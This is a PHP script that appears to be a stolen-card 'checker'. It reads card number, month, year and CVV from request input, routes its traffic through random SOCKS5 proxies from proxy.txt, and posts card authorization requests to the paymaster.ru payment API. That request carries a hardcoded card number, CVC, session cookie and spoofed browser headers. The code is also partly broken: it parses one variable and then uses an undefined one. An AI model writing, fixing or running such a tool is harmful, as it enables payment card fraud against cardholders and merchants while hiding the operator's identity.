<?php 
error_reporting(0);

//---------------------------------------//


//---------------------------------------//
#if(file_exists(getcwd().('/cookie.txt'))){
    #@unlink("cookie.txt");
$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $proxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($proxySocks) - 1);
  $proxySocks = trim($proxySocks[$myproxy]); // remove any leading/trailing whitespace
  $ip = gethostbyname($proxySocks); // get IP address of proxy server
  
  // check if proxy server is working
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
  curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
  curl_setopt($ch, CURLOPT_URL, "http://www.google.com/");
  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  $response = curl_exec($ch);
  $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
  curl_close($ch);

  if ($http_code == 200) {
    return $ip;
  } else {
    return false;
  }
}

$proxyIP = rebootproxys();
if ($proxyIP) {
  echo "Selected proxy server: " . $proxyIP;
} else {
  echo "Failed to select a working proxy server.";
  exit();
}

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);



function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
$ch1 = curl_init();
    curl_setopt($ch1, CURLOPT_URL, 'https://paymaster.ru/cpay/api/Auth/AuthPaymentBankCard');
    curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch1, CURLOPT_POST, 1);
    curl_setopt($ch1, CURLOPT_POSTFIELDS, '{"paymentMethodAlias":"BankCard","cardNumber":"4390930035784303","cardHolder":null,"cardExpirationMonth":11,"cardExpirationYear":2026,"cardCvc":"411","saveCardData":true,"userEmail":"test@gmail.com","language":"en-US","colorDepth":24,"screenHeight":768,"screenWidth":1280,"utcOffsetMinutes":-60}');
    $headers = array();
    $headers[] = 'Content-Type: application/json';
    $headers[] = 'Accept: application/json, text/plain,';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: en-US,en;q=0.6';
    $headers[] = 'Cookie: PATID=tj9dwFstBJr6zAShKvlWHU344JuSdxMpZ397qAKetI7ZT+ZAfcZPxyZI1q5oTbcASYfJFmALNXHzgGcWrPuG0kPapHv0DSCDof4coW0bpptv50pLe5oLZuRauqUn2syP';
    $headers[] = 'Host: paymaster.ru';
    $headers[] = 'Origin: https://paymaster.ru';
    $headers[] = 'PublicId: fbf21d5d-b81b-419f-a9cf-ab7135e8b258';
    $headers[] = 'Referer: https://paymaster.ru/cpay/e4f187f9db314f39b0e369cf62f657ca';
    $headers[] = 'sec-ch-ua-platform: "Windows"';
    $headers[] = 'sec-ch-ua: "Brave";v="111", "Not(A:Brand";v="8", "Chromium";v="111"';
    $headers[] = 'Culture: 1033';
    $headers[] = 'Content-Length: 295';
    $headers[] = 'Sec-Fetch-Mode: cors';
    $headers[] = 'sec-ch-ua-mobile: ?0';
    $headers[] = 'Sec-GPC: 1';
    $headers[] = 'SpaVersion: 2.0.326';
    $headers[] = 'TimezoneOffset: -60';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36*/';
    $headers[] = 'Sec-Fetch-Site: same-origin';
    curl_setopt($ch1, CURLOPT_HTTPHEADER, $headers);
    $curl1 = curl_exec($ch1);
    $s = json_decode($curl1, true);
    echo "<b>Result1: </b> $s <br>";
        curl_close($ch1);